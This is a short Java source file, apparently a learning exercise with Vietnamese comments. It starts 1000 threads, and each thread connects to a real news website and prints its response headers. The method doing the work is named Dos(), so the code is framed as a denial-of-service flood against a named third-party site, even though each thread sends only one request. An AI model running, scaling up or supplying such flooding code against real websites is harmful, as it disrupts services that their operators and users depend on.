package section13;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainWeb {

    public void Dos() throws IOException {
        URL url = new URL("https://www.24h.com.vn/");
        HttpURLConnection urlCon = (HttpURLConnection) url.openConnection();
        for (int i = 0; i < urlCon.getHeaderFields().size(); i++) {
            System.out.println(urlCon.getHeaderFieldKey(i) + "=" + urlCon.getHeaderField(i));
        }
    }
//  Đoạn mã sử dụng for loop để khởi tạo 1000 luồng.
//  Mỗi luồng thực hiện việc gọi phương thức Dos().
//  new Thread(() -> {...}) là cách khởi tạo và chạy một luồng sử dụng biểu thức lambda trong Java.
    public static void main(String[] args) {
        MainWeb mainWeb = new MainWeb();
        int numberOfThreads = 1000;

        // Create and start threads
        for (int i = 0; i < numberOfThreads; i++) {
            new Thread(() -> {
                try {
                    mainWeb.Dos();
                } catch (IOException e) {
                    System.out.println("Error during connection: " + e.getMessage());
                }
            }).start();
        }
    }
}
